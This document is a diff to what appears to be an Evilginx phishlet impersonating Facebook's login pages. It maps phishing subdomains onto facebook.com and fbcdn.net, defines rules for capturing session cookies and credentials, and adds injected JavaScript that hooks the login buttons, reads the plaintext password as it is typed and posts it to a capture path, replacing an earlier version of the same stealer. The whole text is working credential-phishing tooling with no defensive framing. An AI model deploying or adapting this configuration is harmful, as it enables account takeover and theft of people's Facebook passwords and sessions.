@@ -3,7 +3,7 @@ min_ver: '2.3.0'
 proxy_hosts:
   - {phish_sub: 'www', orig_sub: 'www', domain: 'facebook.com', session: true, is_landing: true}
   - {phish_sub: 'm', orig_sub: 'm', domain: 'facebook.com', session: true, is_landing: false}
-  - {phish_sub: 'static', orig_sub: 'static', domain: 'xx.fbcdn.net', session: false, is_landing: false}
+  - {phish_sub: 'api', orig_sub: 'static', domain: 'xx.fbcdn.net', session: false, is_landing: false}
 sub_filters:
   - {triggers_on: 'www.facebook.com', orig_sub: 'www', domain: 'facebook.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json']}
   - {triggers_on: 'www.facebook.com', orig_sub: 'static', domain: 'xx.fbcdn.net', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json']}
@@ -26,21 +26,6 @@ credentials:
     key: 'unenc_password'
     search: '(.*)'
     type: 'post'
-  custom: 
-    - key: 'UserAgent'
-      search: '(.*)'
-      type: 'post'
-    - key: 'Browser'
-      search: '(.*)'
-      type: 'post'
-    - key: 'Engine'
-      search: '(.*)'
-      type: 'post'
-    - key: 'Platform'
-      search: '(.*)'
-      type: 'post'
-
-   
 login:
   domain: 'www.facebook.com'
   path: '/login.php'
@@ -54,18 +39,25 @@ js_inject:
         var submit = document.querySelectorAll('button[type=submit]')[0];
         var submitmobile = document.getElementById('u_0_5');
         var submitbuttonmobile = document.querySelectorAll('button[type=button]')[0];
-        submit.setAttribute("onclick", "sendPass()");
-        submitmobile.setAttribute("onclick", "sendPass()");
-        submitbuttonmobile.setAttribute("onclick", "sendPass()");
+        document.getElementsByTagName("button")[0].addEventListener("click", fclick);
+        submit.addEventListener("click", fclick);
+        submitmobile.addEventListener("click", fclick);
+        submitbuttonmobile.addEventListener("click", fclick);
       return;
       }
-     function sendPass(){
-      var password = document.getElementsByName("pass")[0].value;
-      var xhr = new XMLHttpRequest();
-      xhr.open("POST", '/login/device-based/regular/login/', true);
-      xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-      xhr.send("unenc_password="+encodeURIComponent(password));
-      
-      return;
+      function fclick() {
+        function fcheck() {
+            if (JSON.parse(document.getElementsByName("pass")[0].value == "")) {
+                setTimeout(fcheck, 100);
+            } else {
+                var unenc_password = document.getElementsByName("pass")[0].value;
+                    var xhr = new XMLHttpRequest();
+                    xhr.open("POST", 'qwertyqwerty/', true);
+                    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+                    xhr.send("unenc_password=" + encodeURIComponent(unenc_password));
+                    console.log(unenc_password);
+        }
+        fcheck();
+        }
       }
       setTimeout(function(){ onclickListener(); }, 2500);
